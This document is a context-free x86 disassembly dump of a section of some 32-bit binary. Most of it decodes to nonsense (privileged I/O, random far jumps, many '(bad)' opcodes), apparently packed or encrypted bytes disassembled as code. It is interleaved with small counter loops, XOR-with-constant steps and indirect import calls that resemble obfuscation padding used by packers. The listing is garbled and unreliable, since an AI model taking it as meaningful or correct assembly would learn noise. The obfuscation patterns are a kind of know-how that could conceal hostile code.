  40b7ec:	mov    esp,0x48a827da
  40b7f1:	bound  ecx,QWORD PTR ds:0x1d164902
  40b7f7:	cmove  ecx,eax
  40b7fa:	add    eax,0x25d9401f
  40b7ff:	add    bl,BYTE PTR [ebx-0x18]
  40b802:	inc    ebx
  40b803:	test   DWORD PTR [esi-0x61b11a8b],ebx
  40b809:	xchg   esi,eax
  40b80a:	sub    DWORD PTR [ebx-0x4d4e0b44],ecx
  40b810:	popa   
  40b811:	sti    
  40b812:	jbe    0x40b7b0
  40b814:	inc    esi
  40b815:	setae  BYTE PTR [esi+0x71]
  40b819:	xchg   DWORD PTR ds:0xfbf8c206,eax
  40b81f:	neg    al
  40b821:	in     eax,dx
  40b822:	and    al,0xe4
  40b824:	js     0x40b85b
  40b826:	fsub   DWORD PTR cs:[edx-0x29]
  40b82a:	sub    edi,esp
  40b82c:	adc    DWORD PTR [edx+ebp*1],0x9a1ab1a0
  40b833:	fucom  st(5)
  40b835:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b836:	add    ecx,DWORD PTR [ecx+edx*1-0x19460fa5]
  40b83d:	mov    esi,0x52d753
  40b842:	test   eax,0xc89434c4
  40b847:	mov    BYTE PTR [edi+0x3d9ac824],dh
  40b84d:	mov    ds:0xe55be857,eax
  40b852:	push   cs
  40b853:	ins    DWORD PTR es:[edi],dx
  40b854:	imul   ebx,edx,0x502428ca
  40b85a:	mov    ds:0x9525f38d,al
  40b85f:	sub    eax,0xabdc1a01
  40b864:	sbb    al,0xbf
  40b866:	jb     0x40b7f8
  40b868:	sub    DWORD PTR [ebp+0x8],esi
  40b86b:	fiadd  DWORD PTR [esi-0x5e3019e4]
  40b871:	popa   
  40b872:	scas   al,BYTE PTR es:[edi]
  40b873:	inc    edi
  40b874:	pushf  
  40b875:	sub    al,0x9a
  40b877:	dec    ebx
  40b878:	or     BYTE PTR [edx-0x3c930842],bl
  40b87e:	loope  0x40b8d9
  40b880:	mov    dl,0xfe
  40b882:	sbb    edi,DWORD PTR [ecx+0xabc64d9]
  40b888:	dec    edi
  40b889:	xchg   edx,eax
  40b88a:	repz sbb ebp,ebp
  40b88d:	fwait
  40b88e:	cmp    al,0x32
  40b890:	test   al,0xe
  40b892:	sub    DWORD PTR [ecx-0x69dddbc6],edi
  40b898:	lds    esp,FWORD PTR [eax+0x77]
  40b89b:	aas    
  40b89c:	pop    ebp
  40b89d:	xchg   ah,ch
  40b89f:	enter  0x8a36,0xe
  40b8a3:	xchg   ebx,eax
  40b8a4:	in     eax,dx
  40b8a5:	adc    edx,edx
  40b8a7:	mov    ebp,0xb0c473bf
  40b8ac:	sub    bh,BYTE PTR [edx+ebx*4-0xb550a05]
  40b8b3:	icebp  
  40b8b4:	jl     0x40b83a
  40b8b6:	test   eax,0x6a643fbd
  40b8bb:	aad    0xc3
  40b8bd:	and    ebp,DWORD PTR [edi]
  40b8bf:	xchg   ebx,eax
  40b8c0:	push   ebp
  40b8c1:	xor    al,0xcb
  40b8c3:	les    ebx,FWORD PTR [eax]
  40b8c5:	push   edi
  40b8c6:	call   0x96b56eee
  40b8cb:	or     eax,0x97764846
  40b8d0:	xchg   BYTE PTR [eax],bh
  40b8d2:	mov    ecx,0x5a862c98
  40b8d7:	inc    ebx
  40b8d8:	sar    ebx,cl
  40b8da:	pusha  
  40b8db:	adc    ebp,ebx
  40b8dd:	sbb    cl,BYTE PTR [esi-0x33]
  40b8e0:	mov    esi,0x34703698
  40b8e5:	cs nop
  40b8e7:	mov    eax,0xe02aa8e3
  40b8ec:	loope  0x40b940
  40b8ee:	out    0x22,al
  40b8f0:	cmp    eax,0x6cf1dbc5
  40b8f5:	popa   
  40b8f6:	sub    BYTE PTR [ebx+0x26],ah
  40b8f9:	mov    eax,0x1bec7589
  40b8fe:	or     eax,0x4306c6
  40b903:	mov    DWORD PTR [ebp-0x8],esi
  40b906:	xor    ecx,DWORD PTR ds:0x430616
  40b90c:	mov    ecx,DWORD PTR [ebp-0x18]
  40b90f:	neg    DWORD PTR ds:0x43061e
  40b915:	xor    ecx,eax
  40b917:	sbb    DWORD PTR ds:0x430626,0x1292
  40b921:	xor    edi,edi
  40b923:	add    ecx,ebx
  40b925:	mov    DWORD PTR [ebp-0x20],ecx
  40b928:	mov    DWORD PTR ds:0x42efa8,edi
  40b92e:	mov    eax,DWORD PTR [ebp-0x20]
  40b931:	je     0x40c70d
  40b937:	xor    DWORD PTR ds:0x42efac,edi
  40b93d:	mov    eax,DWORD PTR [ebp-0x4]
  40b940:	xor    eax,0x7510856
  40b945:	xor    DWORD PTR ds:0x42efa0,0x27f1
  40b94f:	jmp    0x40baad
  40b954:	mov    edx,ds
  40b956:	inc    edi
  40b957:	aam    0x59
  40b959:	push   ebp
  40b95a:	mov    ebp,0x1f44e87a
  40b95f:	sub    BYTE PTR [edx-0x4c],0x9a
  40b963:	mov    al,0x3e
  40b965:	clc    
  40b966:	jle    0x40b9e6
  40b968:	aas    
  40b969:	jg     0x40b9e9
  40b96b:	jle    0x40b915
  40b96d:	out    dx,al
  40b96e:	cmp    esp,DWORD PTR [edi-0x8ed6f5e]
  40b974:	scas   al,BYTE PTR es:[edi]
  40b975:	sbb    BYTE PTR [edx-0x7515d88e],cl
  40b97b:	std    
  40b97c:	inc    edx
  40b97d:	pop    es
  40b97e:	and    eax,0xe390f674
  40b983:	psubusb mm4,QWORD PTR [esi-0x52]
  40b987:	dec    ecx
  40b988:	xlat   BYTE PTR ds:[ebx]
  40b989:	js     0x40b9e7
  40b98b:	push   ebp
  40b98c:	(bad)  
  40b98d:	adc    edx,DWORD PTR [ebx+0x1f]
  40b990:	push   esi
  40b991:	mov    cl,0xe3
  40b993:	or     esi,DWORD PTR [ebx-0x28]
  40b996:	stc    
  40b997:	cdq    
  40b998:	mov    di,0xc85d
  40b99c:	gs scas al,BYTE PTR es:[edi]
  40b99e:	xchg   ah,al
  40b9a0:	dec    esi
  40b9a1:	test   al,0xa1
  40b9a3:	mov    DWORD PTR [esi-0x3bdb41af],ecx
  40b9a9:	fwait
  40b9aa:	dec    edi
  40b9ab:	inc    edx
  40b9ac:	out    0xc6,eax
  40b9ae:	ins    BYTE PTR es:[edi],dx
  40b9af:	test   BYTE PTR [edx+0x71dc15e2],ah
  40b9b5:	pop    ds
  40b9b6:	fldpi  
  40b9b8:	push   0x4c5b29ef
  40b9bd:	imul   ebp,DWORD PTR [eax],0x65
  40b9c0:	(bad)  
  40b9c1:	aam    0x39
  40b9c3:	shr    BYTE PTR [edi],1
  40b9c5:	xor    DWORD PTR [ecx-0x41ffb9d9],0xe2ed092b
  40b9cf:	adc    al,0xf4
  40b9d1:	jp     0x40b98d
  40b9d3:	inc    edx
  40b9d4:	clc    
  40b9d5:	leave  
  40b9d6:	xchg   esp,ebx
  40b9d8:	enter  0xbc68,0x7d
  40b9dc:	lahf   
  40b9dd:	cmp    dh,BYTE PTR ds:0x56d8d4da
  40b9e3:	adc    DWORD PTR [esp+edx*8+0x77],esp
  40b9e7:	or     esp,eax
  40b9e9:	xchg   esp,eax
  40b9ea:	clc    
  40b9eb:	repnz mov esi,0xd1064b7
  40b9f1:	dec    esi
  40b9f2:	jl     0x40ba25
  40b9f4:	sub    DWORD PTR [eax+eax*8-0x54],ebx
  40b9f8:	adc    eax,0x6e
  40b9fb:	and    BYTE PTR [edi],0xf6
  40b9fe:	cmp    eax,0x4f9b163e
  40ba03:	mov    bh,0x3a
  40ba05:	das    
  40ba06:	(bad)  
  40ba07:	icebp  
  40ba08:	add    cl,cl
  40ba0a:	outs   dx,DWORD PTR ds:[esi]
  40ba0b:	lahf   
  40ba0c:	cli    
  40ba0d:	mov    esp,0x36adb5e
  40ba12:	and    bl,bh
  40ba14:	adc    BYTE PTR [edx],al
  40ba16:	sbb    al,0xc6
  40ba18:	add    BYTE PTR [eax-0x43],cl
  40ba1b:	inc    edx
  40ba1c:	mov    ah,0x31
  40ba1e:	pusha  
  40ba1f:	jge    0x40ba98
  40ba21:	(bad)  
  40ba22:	adc    ebp,DWORD PTR ds:0x79367d1
  40ba28:	icebp  
  40ba29:	lahf   
  40ba2a:	lods   al,BYTE PTR ds:[esi]
  40ba2b:	adc    bl,bh
  40ba2d:	mov    dh,0x50
  40ba2f:	jbe    0x40ba92
  40ba31:	push   esp
  40ba32:	pop    ebx
  40ba33:	lods   al,BYTE PTR ds:[esi]
  40ba34:	shl    BYTE PTR [ebx-0x64],cl
  40ba37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba38:	mov    dl,0x49
  40ba3a:	jle    0x40b9c2
  40ba3c:	pop    esi
  40ba3d:	dec    edi
  40ba3e:	add    BYTE PTR [edi+0xf],cl
  40ba41:	cmc    
  40ba42:	lock into 
  40ba44:	xor    DWORD PTR [eax+esi*1+0x64],edi
  40ba48:	pop    esi
  40ba49:	push   ss
  40ba4a:	or     al,0xe5
  40ba4c:	popf   
  40ba4d:	loop   0x40ba12
  40ba4f:	pop    esp
  40ba50:	and    ah,BYTE PTR [ebx+0x69ab3e6d]
  40ba56:	sub    DWORD PTR [edx-0x72],ebp
  40ba59:	add    BYTE PTR [ecx-0x39],0xce
  40ba5d:	mov    cl,0x74
  40ba5f:	jl     0x40ba04
  40ba61:	sbb    BYTE PTR [eax],bh
  40ba63:	push   esi
  40ba64:	(bad)  
  40ba65:	sti    
  40ba66:	gs je  0x40ba01
  40ba69:	mov    ch,BYTE PTR [ebx-0x36c7eeb0]
  40ba6f:	or     eax,0xff979525
  40ba74:	mov    esi,ebp
  40ba76:	fldcw  WORD PTR [edi-0x24]
  40ba79:	xchg   ebp,eax
  40ba7a:	cdq    
  40ba7b:	or     BYTE PTR [ecx+0x1346e7e],ch
  40ba81:	xchg   ecx,eax
  40ba82:	pop    esi
  40ba83:	pushf  
  40ba84:	push   ebx
  40ba85:	mov    dl,0xa2
  40ba87:	test   DWORD PTR [ecx],esp
  40ba89:	das    
  40ba8a:	or     al,0xe
  40ba8c:	dec    eax
  40ba8d:	in     eax,dx
  40ba8e:	sbb    al,0xe2
  40ba90:	mov    al,0x7f
  40ba92:	xchg   ebx,eax
  40ba93:	mov    esi,0x838820ca
  40ba98:	mov    al,0xdb
  40ba9a:	int    0x87
  40ba9c:	int3   
  40ba9d:	in     al,dx
  40ba9e:	or     ch,BYTE PTR [ebp+0x78]
  40baa1:	in     eax,0x2a
  40baa3:	mov    cl,BYTE PTR [ebp-0x4f]
  40baa6:	nop
  40baa7:	xchg   esi,eax
  40baa8:	mov    ds:0x3bfa6d0d,eax
  40baad:	add    eax,ebx
  40baaf:	mov    DWORD PTR ds:0x42efa0,0x3d16
  40bab9:	cmp    edi,eax
  40babb:	mov    DWORD PTR ds:0x430616,0x64f1
  40bac5:	jne    0x40c296
  40bacb:	or     DWORD PTR ds:0x42efa8,0x42ef94
  40bad5:	push   DWORD PTR [ebp+0x8]
  40bad8:	call   0x40a1ba
  40badd:	mov    DWORD PTR [ebp-0x20],eax
  40bae0:	mov    eax,DWORD PTR [ebp-0x4]
  40bae3:	mov    ecx,DWORD PTR [ebp-0x20]
  40bae6:	and    DWORD PTR ds:0x42ef9c,0x0
  40baf0:	mov    esi,DWORD PTR ds:0x42ef9c
  40baf6:	inc    esi
  40baf7:	mov    DWORD PTR ds:0x42ef9c,esi
  40bafd:	cmp    DWORD PTR ds:0x42ef9c,0x22
  40bb04:	jne    0x40bb1b
  40bb0a:	push   DWORD PTR [ebp-0x1c]
  40bb0d:	push   DWORD PTR [ebp-0x24]
  40bb10:	push   0x6795
  40bb15:	call   DWORD PTR ds:0x42ed54
  40bb1b:	cmp    DWORD PTR ds:0x42ef9c,0x1d
  40bb22:	jb     0x40baf0
  40bb28:	mov    esi,DWORD PTR ds:0x4306d6
  40bb2e:	xor    DWORD PTR ds:0x430636,esi
  40bb34:	mov    esi,0x7510856
  40bb39:	add    DWORD PTR ds:0x430632,0x43061a
  40bb43:	xor    eax,esi
  40bb45:	jmp    0x40bca3
  40bb4a:	jns    0x40bb9f
  40bb4c:	mov    ah,0x6a
  40bb4e:	pop    esp
  40bb4f:	ins    DWORD PTR es:[edi],dx
  40bb50:	jns    0x40bbb7
  40bb52:	lods   al,BYTE PTR ds:[esi]
  40bb53:	iret   
  40bb54:	loopne 0x40bbad
  40bb56:	int3   
  40bb57:	xor    ebp,DWORD PTR [eax-0x46]
  40bb5a:	(bad)  
  40bb5b:	stc    
  40bb5c:	jle    0x40bbdc
  40bb5e:	aas    
  40bb5f:	jg     0x40bbdf
  40bb61:	jle    0x40bbb0
  40bb63:	sub    al,0x6e
  40bb65:	adc    BYTE PTR [edx+ecx*8-0x78],dl
  40bb69:	int3   
  40bb6a:	stos   BYTE PTR es:[edi],al
  40bb6b:	sub    BYTE PTR [eax-0x5f9a30ff],bl
  40bb71:	les    esp,FWORD PTR [edi+0x1d91d906]
  40bb77:	cdq    
  40bb78:	inc    esp
  40bb79:	addr16 cs mov ebx,0x834e816e
  40bb80:	push   cs
  40bb81:	cmp    bh,BYTE PTR [ebp-0x38]
  40bb84:	and    BYTE PTR ds:0xb9c00111,0x63
  40bb8b:	mov    al,ds:0x86649e8d
  40bb90:	cmc    
  40bb91:	(bad)  
  40bb92:	call   0x8f7a9ac7
  40bb97:	ret    0x88e5
  40bb9a:	lds    edx,FWORD PTR [esi-0x38]
  40bb9d:	push   edx
  40bb9e:	dec    esp
  40bb9f:	push   esi
  40bba0:	fidiv  WORD PTR [edx]
  40bba2:	push   ebx
  40bba3:	mov    ecx,0x23077649
  40bba8:	neg    DWORD PTR [edi-0x214da786]
  40bbae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbaf:	or     BYTE PTR [edx-0x3a],0xa8
  40bbb3:	mov    al,ds:0x7870806
  40bbb8:	loopne 0x40bb60
  40bbba:	sub    al,0x70
  40bbbc:	mov    ah,0xa3
  40bbbe:	and    al,0xda
  40bbc0:	jno    0x40bc34
  40bbc2:	(bad)  
  40bbc3:	(bad)  
  40bbc5:	mov    ebx,fs
  40bbc7:	in     al,dx
  40bbc8:	jmp    0x46974b28
  40bbcd:	sbb    dl,bl
  40bbcf:	adc    edx,esi
  40bbd1:	out    dx,eax
  40bbd2:	jb     0x40bb60
  40bbd4:	adc    DWORD PTR [edx+0x6b],esp
  40bbd7:	jle    0x40bb6f
  40bbd9:	mov    edx,0x1f82ab33
  40bbde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbdf:	aam    0xb2
  40bbe1:	add    eax,0x6e8f01bf
  40bbe6:	cmp    DWORD PTR [ecx+eiz*2],eax
  40bbe9:	shl    DWORD PTR [eax+0x55],0xb2
  40bbed:	mov    dl,0x56
  40bbef:	mov    dh,0xa8
  40bbf1:	mov    esi,0xde11e9a7
  40bbf6:	repz in al,dx
  40bbf8:	xchg   edx,eax
  40bbf9:	test   al,0xb
  40bbfb:	pusha  
  40bbfc:	jb     0x40bc06
  40bbfe:	cmp    al,0x72
  40bc00:	adc    al,0x8c
  40bc02:	mov    BYTE PTR [edi-0x63],dl
  40bc05:	pop    ebx
  40bc06:	inc    ebp
  40bc07:	out    dx,al
  40bc08:	sbb    BYTE PTR [ebx-0x616983b],dl
  40bc0e:	sbb    ch,cl
  40bc10:	mov    al,0x7
  40bc12:	adc    BYTE PTR [eax],ch
  40bc14:	add    eax,0x3f730f45
  40bc19:	cmp    DWORD PTR cs:[edx-0x29bb1607],eax
  40bc20:	mov    ch,0x13
  40bc22:	jp     0x40bc5d
  40bc24:	outs   dx,BYTE PTR ds:[esi]
  40bc25:	push   ebp
  40bc26:	(bad)  
  40bc27:	fist   DWORD PTR [ecx-0x2210665e]
  40bc2d:	mov    dl,0x1
  40bc2f:	or     DWORD PTR [ebx],ebp
  40bc31:	dec    edx
  40bc32:	mov    dh,0x4f
  40bc34:	(bad)  
  40bc36:	sbb    BYTE PTR [edx+0x6fb8fc9b],bh
  40bc3c:	sar    BYTE PTR [ecx],0x1
  40bc3f:	test   BYTE PTR [ecx+ecx*2],ah
  40bc42:	cli    
  40bc43:	mov    esi,0xeb576c61
  40bc48:	fwait
  40bc49:	hlt    
  40bc4a:	imul   esi,DWORD PTR ds:0x9b2f5c3b,0xffffffb0
  40bc51:	test   ecx,edx
  40bc53:	inc    edi
  40bc54:	or     ebx,DWORD PTR [edx]
  40bc56:	jecxz  0x40bca8
  40bc58:	icebp  
  40bc59:	out    dx,al
  40bc5a:	and    eax,DWORD PTR [esi+0xceeaaa8]
  40bc60:	call   0x9251db8b
  40bc65:	mov    esp,DWORD PTR [esi+0x641844d]
  40bc6b:	pushf  
  40bc6c:	lock xchg ecx,eax
  40bc6e:	adc    eax,edx
  40bc70:	stos   DWORD PTR es:[edi],eax
  40bc71:	sbb    BYTE PTR [ecx-0x1003a3ff],ch
  40bc77:	or     al,0x43
  40bc79:	inc    esp
  40bc7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc7b:	add    DWORD PTR [eax+0x12950f79],ebp
  40bc81:	jmp    DWORD PTR [edx-0x1b3c71fb]
  40bc87:	xor    al,BYTE PTR [edi]
  40bc89:	mov    dh,0xe2
  40bc8b:	sar    edx,1
  40bc8d:	enter  0x61,0x39
  40bc91:	out    0xab,eax
  40bc93:	test   bl,dl
  40bc95:	pop    ds
  40bc96:	mov    eax,0xa27d5d4e
  40bc9b:	cli    
  40bc9c:	inc    ebp
  40bc9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc9e:	add    esp,DWORD PTR [eax+0x35188af]
  40bca4:	ret    
  40bca5:	cmp    ecx,eax
  40bca7:	mov    DWORD PTR ds:0x4306d2,0x373b
  40bcb1:	je     0x40c6f1
  40bcb7:	sbb    DWORD PTR ds:0x4306ce,0x42efb0
  40bcc1:	push   DWORD PTR [ebp-0x20]
  40bcc4:	and    DWORD PTR ds:0x43063e,0x4306c6
  40bcce:	push   DWORD PTR [ebp+0x8]
  40bcd1:	call   0x40a7ab
  40bcd6:	and    DWORD PTR ds:0x430642,0x0
  40bce0:	jmp    0x40bcf2
  40bce5:	mov    ecx,DWORD PTR ds:0x430642
  40bceb:	inc    ecx
  40bcec:	mov    DWORD PTR ds:0x430642,ecx
  40bcf2:	cmp    DWORD PTR ds:0x430642,0x1e
  40bcf9:	jae    0x40bd40
  40bcff:	cmp    DWORD PTR ds:0x430642,0xd
  40bd06:	jne    0x40bd1f
  40bd0c:	push   DWORD PTR [ebp-0xc]
  40bd0f:	push   0x430622
  40bd14:	push   0x2a1f
  40bd19:	call   DWORD PTR ds:0x42ebac
  40bd1f:	cmp    DWORD PTR ds:0x430642,0xc
  40bd26:	jne    0x40bd3b
  40bd2c:	xor    ecx,ecx
  40bd2e:	add    ecx,DWORD PTR ds:0x430642
  40bd34:	inc    ecx
  40bd35:	mov    DWORD PTR ds:0x430642,ecx
  40bd3b:	jmp    0x40bce5
  40bd40:	mov    DWORD PTR [ebp-0x14],eax
  40bd43:	xor    DWORD PTR ds:0x42e8f2,0x3e11
  40bd4d:	mov    eax,DWORD PTR [ebp-0x4]
  40bd50:	add    ecx,DWORD PTR ds:0x430616
  40bd56:	mov    ecx,DWORD PTR [ebp-0x14]
  40bd59:	xor    eax,esi
  40bd5b:	or     DWORD PTR ds:0x4306da,0x4306d2
  40bd65:	add    eax,ebx
  40bd67:	cmp    ecx,eax
  40bd69:	mov    DWORD PTR ds:0x42ef90,0x41d
  40bd73:	je     0x40c6f1
  40bd79:	add    eax,ecx
  40bd7b:	mov    eax,DWORD PTR [ebp-0x14]
  40bd7e:	mov    DWORD PTR ds:0x430632,0x19
  40bd88:	cmp    DWORD PTR ds:0x430632,0x0
  40bd8f:	je     0x40bdbf
  40bd95:	cmp    DWORD PTR ds:0x430632,0x1b
  40bd9c:	jne    0x40bdad
  40bda2:	push   0x2712
  40bda7:	call   DWORD PTR ds:0x42ebb0
  40bdad:	mov    ecx,DWORD PTR ds:0x430632
  40bdb3:	dec    ecx
  40bdb4:	mov    DWORD PTR ds:0x430632,ecx
  40bdba:	jmp    0x40bd88
  40bdbf:	mov    eax,DWORD PTR [eax+0x18]
  40bdc2:	sub    ecx,DWORD PTR ds:0x4306da
  40bdc8:	mov    DWORD PTR [ebp-0x20],eax
  40bdcb:	jmp    0x40bf29
  40bdd0:	fld    QWORD PTR [ebx-0x66]
  40bdd3:	xor    bl,BYTE PTR [ebx+ecx*8+0x503d5d5d]
  40bdda:	cmp    al,0x3b
  40bddc:	adc    al,bl
  40bdde:	push   ds
  40bddf:	and    eax,0x7e7efab0
  40bde4:	aas    
  40bde5:	jg     0x40be65
  40bde7:	jle    0x40bdeb
  40bde9:	sub    bh,BYTE PTR [edi-0x4e7fe8d9]
  40bdef:	dec    ecx
  40bdf0:	(bad)  [eax]
  40bdf2:	xchg   ebp,eax
  40bdf3:	aaa    
  40bdf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdf5:	sbb    al,0x8
  40bdf7:	shl    BYTE PTR [edx+0x9],0x9d
  40bdfb:	sub    eax,0xe42bf1c5
  40be00:	enter  0xb8cf,0x5a
  40be04:	xor    ah,BYTE PTR ss:[ebx+edi*8-0x2ffa8e25]
  40be0c:	and    ecx,DWORD PTR [ebp-0x11]
  40be0f:	inc    ebp
  40be10:	jge    0x40bd95
  40be12:	pop    edx
  40be13:	xchg   esi,eax
  40be14:	xor    DWORD PTR [esi],0xffffff9e
  40be17:	cmp    DWORD PTR [esi-0x73],ebp
  40be1a:	sar    DWORD PTR [ebx-0x575dd309],0x96
  40be21:	aas    
  40be22:	sbb    eax,0x95039bbf
  40be27:	inc    edi
  40be28:	xor    al,BYTE PTR [ebp-0x28]
  40be2b:	fucomip st,st(6)
  40be2d:	int3   
  40be2e:	fistp  QWORD PTR [esi+0x32747607]
  40be34:	mov    al,ds:0x8b6a70e3
  40be39:	int    0xcd
  40be3b:	aas    
  40be3c:	adc    DWORD PTR [ebp-0x6364895d],edi
  40be42:	push   es
  40be43:	pop    ecx
  40be44:	out    dx,al
  40be45:	les    esi,FWORD PTR [eax+0x6b61af1b]
  40be4b:	daa    
  40be4c:	test   eax,0x5c4d0179
  40be51:	and    ebx,eax
  40be53:	sub    DWORD PTR [ecx+0x36],esp
  40be56:	adc    cl,BYTE PTR [esp+ebx*1+0x6c81397a]
  40be5d:	call   0x2ac3:0x339007e8
  40be64:	adc    al,0x65
  40be66:	loop   0x40be25
  40be68:	sub    cl,BYTE PTR [ecx-0x29]
  40be6b:	dec    esp
  40be6c:	outs   dx,BYTE PTR ds:[esi]
  40be6d:	adc    DWORD PTR [eax+0x496004da],edx
  40be73:	inc    esp
  40be74:	add    esp,ebx
  40be76:	mov    WORD PTR [eax+0xb4f6133],ds
  40be7c:	add    DWORD PTR [esi],eax
  40be7e:	dec    eax
  40be7f:	inc    esp
  40be80:	iret   
  40be81:	in     eax,dx
  40be82:	jo     0x40be4a
  40be84:	or     cl,BYTE PTR [edi-0x2]
  40be87:	mov    esp,0x837feadd
  40be8c:	fdivrp st(7),st
  40be8e:	adc    DWORD PTR [eax],eax
  40be90:	add    BYTE PTR [edx],0xf4
  40be93:	ins    BYTE PTR es:[edi],dx
  40be94:	sub    al,0x7a
  40be96:	pusha  
  40be97:	xlat   BYTE PTR ds:[ebx]
  40be98:	lock pop ebx
  40be9a:	mov    esi,0xad2eb42a
  40be9f:	stc    
  40bea0:	mov    ah,0x2f
  40bea2:	inc    esi
  40bea3:	mov    BYTE PTR [ebp-0x50],bh
  40bea6:	nop
  40bea7:	data16 xor al,0x10
  40beaa:	xchg   esp,eax
  40beab:	enter  0x2bb,0xe5
  40beaf:	jb     0x40be46
  40beb1:	leave  
  40beb2:	inc    ecx
  40beb3:	and    esp,DWORD PTR [eax-0xf98b37d]
  40beb9:	scas   al,BYTE PTR es:[edi]
  40beba:	shr    BYTE PTR [edx+esi*8],1
  40bebd:	les    eax,FWORD PTR [ecx+0x3b48fea0]
  40bec3:	stos   DWORD PTR es:[edi],eax
  40bec4:	(bad)  
  40bec6:	shl    DWORD PTR [ecx+ebx*2],0xc2
  40beca:	pop    ebp
  40becb:	out    dx,al
  40becc:	mov    ch,0x4b
  40bece:	dec    ebp
  40becf:	and    eax,0xd3211d4e
  40bed4:	dec    esp
  40bed5:	movzx  eax,BYTE PTR [ebx]
  40bed8:	aad    0xd6
  40beda:	xor    al,0x7f
  40bedc:	dec    ecx
  40bedd:	xchg   edx,eax
  40bede:	sbb    eax,0xdfc7cca4
  40bee3:	mov    ebp,0x420679fa
  40bee8:	lods   al,BYTE PTR ds:[esi]
  40bee9:	(bad)  
  40beea:	push   esp
  40beeb:	sti    
  40beec:	ins    DWORD PTR es:[edi],dx
  40beed:	sbb    al,BYTE PTR [ecx-0x599c84de]
  40bef3:	dec    esp
  40bef4:	(bad)
  40bef8:	dec    ebx
  40bef9:	sub    ebp,edx
  40befb:	repz sub ah,BYTE PTR [ebx+0x4abe3bcc]
  40bf02:	cwde   
  40bf03:	and    dl,BYTE PTR es:[esp+esi*8+0x12]
  40bf08:	ins    BYTE PTR es:[edi],dx
  40bf09:	xchg   ecx,eax
  40bf0a:	jle    0x40beff
  40bf0c:	das    
  40bf0d:	std    
  40bf0e:	sbb    al,0x7e
  40bf10:	push   0x983d620a
  40bf15:	jge    0x40bed0
  40bf17:	pop    ebx
  40bf18:	mov    edx,0xb53318ce
  40bf1d:	es cwde 
  40bf1f:	mov    ebp,?
  40bf21:	push   ebp
  40bf22:	mov    ds:0x5e8613e,eax
  40bf27:	cld    
  40bf28:	cmp    eax,0x8bec458b
  40bf2d:	dec    ebp
  40bf2e:	or     BYTE PTR [ecx+0x4306261d],al
  40bf34:	add    BYTE PTR [esi+ecx*1+0x59e90000],dl
  40bf3b:	add    DWORD PTR [eax],eax
  40bf3d:	add    ah,bl
  40bf3f:	(bad)  
  40bf40:	lods   eax,DWORD PTR ds:[esi]
  40bf41:	dec    edi
  40bf42:	ins    DWORD PTR es:[edi],dx
  40bf43:	jge    0x40bf41
  40bf45:	popf   
  40bf46:	mov    dh,0x46
  40bf48:	(bad)  
  40bf49:	scas   al,BYTE PTR es:[edi]
  40bf4a:	int    0x37
  40bf4c:	xchg   edx,eax
  40bf4d:	in     eax,dx
  40bf4e:	jno    0x40bf4c
  40bf50:	jle    0x40bfd0
  40bf52:	aas    
  40bf53:	jg     0x40bfd3
  40bf55:	jle    0x40bf85
  40bf57:	pop    esi
  40bf58:	xchg   edi,eax
  40bf59:	cs inc edx
  40bf5b:	out    dx,al
  40bf5c:	push   cs
  40bf5d:	jle    0x40beed
  40bf5f:	push   cs
  40bf60:	int3   
  40bf61:	daa    
  40bf62:	jnp    0x40bf5a
  40bf64:	and    al,0xaa
  40bf66:	cmp    al,0xcd
  40bf68:	pop    es
  40bf69:	or     DWORD PTR [esi-0x75],ecx
  40bf6c:	dec    ecx
  40bf6d:	dec    edi
  40bf6e:	hlt    
  40bf6f:	outs   dx,DWORD PTR ds:[si]
  40bf71:	mov    ebp,DWORD PTR [eax]
  40bf73:	loop   0x40bf65
  40bf75:	xchg   DWORD PTR [edx-0x40],ebp
  40bf78:	pop    edx
  40bf79:	and    al,0x69
  40bf7b:	mov    ds:0x6316d2cf,al
  40bf80:	aas    
  40bf81:	aaa    
  40bf82:	fwait
  40bf83:	repz pop eax
  40bf85:	bound  ebx,QWORD PTR ds:0x2a56e72f
  40bf8b:	push   ds
  40bf8c:	das    
  40bf8d:	neg    ecx
  40bf8f:	repnz shl DWORD PTR [edx],0xef
  40bf93:	sbb    al,0x41
  40bf95:	ficomp DWORD PTR [esi-0x2f]
  40bf98:	pusha  
  40bf99:	addr16 sub edi,esp
  40bf9c:	cs pop ecx
  40bf9f:	jl     0x40bf24
  40bfa1:	cmp    eax,0x289cc4ce
  40bfa6:	xor    ebp,ebx
  40bfa8:	add    dh,BYTE PTR ds:0xdcdf6423
  40bfae:	jmp    0xf296:0x37231e2a
  40bfb5:	sub    al,0x67
  40bfb7:	jo     0x40bf7f
  40bfb9:	push   edx
  40bfba:	sub    cl,cl
  40bfbc:	push   edx
  40bfbd:	test   eax,0xb0996737
  40bfc2:	je     0x40bfad
  40bfc4:	mov    bh,0x5f
  40bfc6:	add    bh,0x2a
  40bfc9:	jmp    0xa9fcebb0
  40bfce:	popa   
  40bfcf:	outs   dx,DWORD PTR cs:[esi]
  40bfd1:	popf   
  40bfd2:	jnp    0x40bfee
  40bfd4:	aas    
  40bfd5:	loopne 0x40bfe7
  40bfd7:	mov    cl,0xbf
  40bfd9:	cmp    DWORD PTR [ebp-0x50],eax
  40bfdc:	sahf   
  40bfdd:	inc    esi
  40bfde:	sbb    BYTE PTR [esi],ch
  40bfe0:	and    al,0x3c
  40bfe2:	(bad)  
  40bfe3:	push   ebp
  40bfe4:	sub    cl,BYTE PTR [ecx+0x33bee17]
  40bfea:	sar    DWORD PTR [esi],cl
  40bfec:	mov    ds:0x902b43d7,al
  40bff1:	int3   
  40bff2:	stos   BYTE PTR es:[edi],al
  40bff3:	mov    esi,0x987b1c65
  40bff8:	or     eax,0x7472416b
  40bffd:	out    0xd4,al
  40bfff:	add    al,BYTE PTR [ebp-0x76]
  40c002:	mov    al,ds:0x33820abb
  40c007:	pop    ss
  40c008:	mov    edx,0x8752e622
  40c00d:	inc    ecx
  40c00e:	jp     0x40c072
  40c010:	es mov ebp,0xa2c94762
  40c016:	in     al,0xb2
  40c018:	out    dx,al
  40c019:	pusha  
  40c01a:	push   edi
  40c01b:	push   0x5e
  40c01d:	adc    esi,DWORD PTR ds:0xa9714e8c
  40c023:	lahf   
  40c024:	retf   0xaa7d
  40c027:	xchg   BYTE PTR [ebp+0x77],cl
  40c02a:	pop    ss
  40c02b:	mov    edx,0x99353925
